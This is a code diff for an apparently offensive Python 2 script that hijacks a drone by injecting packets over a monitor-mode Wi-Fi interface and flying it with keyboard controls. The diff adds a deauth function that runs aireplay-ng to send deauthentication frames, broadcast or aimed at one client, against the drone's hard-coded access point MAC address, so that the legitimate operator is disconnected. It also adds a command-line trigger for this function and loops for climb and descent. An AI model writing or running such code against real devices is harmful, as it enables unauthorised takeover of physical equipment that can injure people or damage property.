@@ -188,6 +188,20 @@ def gauche():
 	sendp(pkt,iface='mon0',count=1,verbose=0)
 
 
+###################   DEAUTH USER FUNCTION   ###################
+def deauth():
+	print "**** Let's DEAUTH the user ! ****"
+	rep = raw_input("Broadcast/Target mode ? [B/t]")
+	if rep == 'B' or rep == 'b' or rep == '':
+		print "Broadcast deauth running"
+		os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 mon0")
+	else:
+		rep = raw_input("Use "+MAC_src+" ? [Y/n]")
+		if rep == 'Y' or rep == 'y' or rep == '':
+			os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 -c "+MAC_src+" mon0")
+		else:
+			rep = raw_input("Enter MAC address to deauth : ")
+			os.system("aireplay-ng -0 20 -a 90:03:b7:fd:22:49 -c "+rep+" mon0")
 
 
 
@@ -234,11 +248,13 @@ if len(args) > 4:
     parser.error("wrong number of arguments")
 
 # ip_drone = '192.168.1.1'
-# MAC_drone = '90:03:b7:fd:22:49'
+#MAC_drone = '90:03:b7:fd:22:49'
 seq = 1000
 ip_src = options.ip_address
 MAC_src = options.MAC_address
 interface = options.interface
+if options.deauth:
+	deauth()
 if options.commands:
 	commands()
 
@@ -272,8 +288,14 @@ while running:
             # Monte / Descend
             elif event.key == pygame.K_z:
                 print "Monte"
+                for i in xrange(1,10):
+            		up()
+            		time.sleep(0.1)
             elif event.key == pygame.K_s:
                 print "Descend"
+                for i in xrange(1,10):
+            		down()
+            		time.sleep(0.1)
             # Tourne a gauche / droite (pas de deplacement)
             elif event.key == pygame.K_q:
                 print "Tourne a gauche"
